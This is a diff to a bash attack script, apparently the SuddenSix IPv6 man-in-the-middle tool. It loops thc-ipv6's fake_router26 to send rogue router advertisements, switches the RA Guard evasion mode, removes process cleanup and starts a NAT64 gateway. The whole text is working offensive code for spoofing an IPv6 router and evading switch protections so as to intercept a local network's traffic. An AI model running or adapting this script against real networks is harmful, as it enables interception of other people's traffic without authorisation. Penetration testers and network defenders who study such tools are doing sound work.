@@ -239,7 +239,7 @@ function startFakeRouter {
     while true
     do
 	echo "restarting router"
-	atk6-fake_router26 ${DINTERFACE} -E F -A ${DEFAULT6PREFIX}:/${DIP6CIDR} -F other -D ${DIP6} -d 30
+	atk6-fake_router26 ${DINTERFACE} -E o -A ${DEFAULT6PREFIX}:/${DIP6CIDR} -F other -D ${DIP6} -d 30
 	sleep 3
     done
 }
@@ -249,14 +249,12 @@ function serviceStatusCheck {
     for item in ${SERVICES[*]}
     do
 		echo -n $item 'service status: '
-        systemctl status $item | grep Active:
+        systemctl status $item | grep Active: | replace 'Active:' ''
     done
 }
 
 #EXECUTION
 #cleanup old instances of suddensix & fake_router running in the background
-killall suddensix.sh -o 2s 2>/dev/null
-killall atk6-fake_router26 2>/dev/null
 
 /bin/ping6 -c 3 google.com && ( echo "I am able to IPv6 ping google.com already, bailing out."; exit )
 
@@ -274,12 +272,12 @@ fi
 echo "This is your current address information: "
 sipcalc $DINTERFACE
 # Prompt for thc-ipv6 use
-read -p "Use fake_router26 from thc-ipv6 to attempt full RA Guard evasion? [Y/n]"
+read -p "Use fake_router26 from thc-ipv6 to attempt full RA Guard evasion [Y/n]? "
 if [[ $REPLY =~ [Yy] ]] || [ -z "$REPLY" ]
 then
-    FRAGMENT=true
+    THC=true
 else
-    FRAGMENT=false
+    THC=false
 fi
 
 
@@ -303,7 +301,7 @@ if startTayga; then
     #TODO: check if we need to enable them
     service radvd stop
     sleep 3
-    if $FRAGMENT
+    if $THC
     then
         startFakeRouter >> ${ROUTERLOG} 2>&1 &
         echo "fake_router26 should be running as daemon
